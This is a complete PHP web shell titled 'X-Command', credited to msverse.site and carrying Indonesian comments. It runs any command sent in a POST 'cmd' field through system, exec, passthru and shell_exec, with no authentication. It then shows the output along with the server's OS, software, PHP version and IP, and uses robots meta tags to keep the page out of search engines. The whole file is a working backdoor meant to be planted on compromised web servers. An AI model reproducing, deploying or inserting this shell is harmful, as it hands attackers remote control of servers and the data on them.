<?php
// author: msverse.site
// website: https://www.msverse.site
// jangan diedit
if (isset($_POST['cmd'])) {
    $output = '';
    if (function_exists('system')) {
        ob_start();
        system($_POST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
    }
    if (function_exists('exec')) {
        exec($_POST['cmd'], $output);
        $output = implode("\n", $output);
    }
    if (function_exists('passthru')) {
        ob_start();
        passthru($_POST['cmd']);
        $output = ob_get_contents();
        ob_end_clean();
    }
    if (function_exists('shell_exec')) {
        $output = shell_exec($_POST['cmd']);
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<!-- blokir mesin pencarian -->
<meta name="author" content="msverse.site">
<meta name="robots" content="noindex"/>
<meta name="googlebot" content="noindex"/>
<meta name="googlebot-news" content="nosnippet"/>
<meta name="robots" content="noarchive"/>
<meta name="robots" content="nocache"/>
<meta name="robots" content="noodp"/>
<meta name="robots" content="nosnippet"/>
<meta name="yandex" content="noindex, nofollow" />
<!-- end -->
    <title>Command</title>
    <!-- CSS font awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
/* jangan diubah */
.logo {
font-size: 20px; 
color: #ff0000; 
}

.banner {
background-color: #f1f1f1; 
padding: 10px; 
text-align: center;
}

.input-s input[type="text"] {
width: 300px;
padding: 10px;
}

.input-s input[type="submit"] {
padding: 10px 20px;
background-color: #ff0000;
color: #ffffff;
border: none;
cursor: pointer;
}

.footer {
margin-top: 20px;
text-align: center;
}
/* end */
</style>
</head>
<body>
    <!-- logo terminal -->
    <div class="banner">
     <h1><i class="fas fa-terminal logo"></i> X-Command</h1>
    </div>
    <!-- end -->
            
    <!-- logo system -->
    <p><b>System :</b> <i class="fas fa-hdd"></i> <?php echo php_uname('a'); ?></p>    
    <p><b>SOFTWARE :</b> <i class="fab fa-windows"></i> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
    <p><b>PHP :</b> <i class="fab fa-php"></i> <?php echo phpversion(); ?></p>
    <p><b>IP :</b> <i class="fas fa-globe"></i> <?php echo $_SERVER['SERVER_ADDR']; ?></p>    
    <!-- end -->
    
    <!-- command -->
   <div class="input-s">
    <form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <input type="text" name="cmd" placeholder="Command" required/>
        <input type="submit" value="Execute"/>
    </form>
    </div>
    <!-- end -->
    
    <?php if (isset($output)) : ?>
        <pre><?php echo $output; ?></pre>
    <?php endif; ?>
    
    <div class="footer">
         <p>Copyright : <a href	="https://www.msverse.site/" alt="Terminal" target="_blank"/>msverse.site</a></p>
    </div>
</body>
</html>